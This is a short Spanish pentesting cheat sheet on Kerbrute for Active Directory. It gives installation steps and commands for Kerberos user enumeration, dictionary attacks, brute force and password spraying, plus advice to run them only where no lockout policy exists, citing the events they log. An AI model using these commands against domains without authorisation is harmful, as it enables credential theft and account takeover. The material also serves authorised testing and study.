# Kerbrute 

Tags: #AD #Kerberos #Kali 

## Servicios en el dominio

```powershell 
# Utilizar PowerView para hacer el reconocimiento 
❯ Get-NetComputer -Identity WS01     # Obtener la info del computador así como su 'ServicePrincipalName (SPN)' que es el servicio que ofrece 
```

## Instalación 

```bash 
# Instalación de la herramienta 
❯ sudo apt install golang 

# Agregar las variables de entorno al final del doc '.zshrc'
❯ sudo emacs .zshrc 
	 export GOROOT=/usr/lib/go
	 export GOPATH=$HOME/go
	 export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
❯ source .zshrc    # Recargar la configuración 

❯ go get github.com/ropnop/kerbrute       # Descargar e instalar la herramienta 
```

## Comandos 

```bash 
# Utilizar Kali 
❯ kerbrute -h   # Menú de ayuda 

❯ kerbrute userenum -d domain users.txt       # Enumeración de usuarios validos 

❯ kerbrute bruteuser -d domain passwd.txt username    # Ataque de diccionario
	# username = Es el usuario al que se le probarán las diferentes contraseñas
	# passwd.txt = Lista de contraseñas 
# Ejecutarlo si se esta seguro de que no existe una política de bloqueo ya que genera:
	- ID 4768 A kerberos authentication ticket (TGT) was requested
	- ID 4771 Kerberos pre-authentication failed 

# Ataque de fuerza bruta donde probará los diferentes usuarios y contraseñas
❯ kerbrute bruteforce -d domain user_pass.txt 
	# Formato del archivo 'user_pass.txt':
		user1:password1

❯ kerbrute passwordspray -d domain users.txt password123 # Ejecutar un Password Spraying 
	# password123 = Es la contraseña que se le probará a los diferentes usuarios
	# users.txt = Lista de usuarios
# Ejecutarlo si se esta seguro de que no existe una política de bloqueo ya que genera:
	- ID 4768 A kerberos authentication ticket (TGT) was requested
	- ID 4771 Kerberos pre-authentication failed 
```